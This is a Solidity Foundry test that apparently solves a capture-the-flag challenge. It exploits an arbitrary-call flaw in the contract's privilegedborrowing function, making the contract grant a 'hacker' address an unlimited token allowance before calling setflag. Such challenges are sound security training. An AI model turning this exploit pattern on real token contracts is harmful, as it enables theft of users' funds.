// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
pragma abicoder v2;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {ExistingStock} from "../src/Simplecall.sol";

contract CallTest is Test {
    address internal constant contractAddress =
        0xb7040A7A2C8104066f3bB3D8ea6aBcbd1fab6e14;

    // ExistingStock internal target = ExistingStock(contractAddress);
    ExistingStock internal target;

    address internal owner;
    address internal hacker;

    function setUp() public {
        owner = makeAddr("owner");
        hacker = makeAddr("hacker");
        vm.prank(owner);
        target = new ExistingStock();
    }

    function test_hack() public {
        vm.startPrank(hacker);
        target.transfer(address(target), 1);
        target.privilegedborrowing(
            1,
            address(0),
            address(target),
            abi.encodeWithSelector(
                ExistingStock.approve.selector,
                hacker,
                uint256(-1)
            )
        );
        target.setflag();
        vm.stopPrank();

        console.log(target.balanceOf(hacker), "balanceOf");
        console.log(target.allowance(address(target), hacker), "approve");

        assertTrue(target.balanceOf(hacker) > 200000, "balanceOf");
        assertTrue(
            target.allowance(address(target), hacker) > 200000,
            "allowance"
        );
        assertTrue(target.isSolved());
    }
}
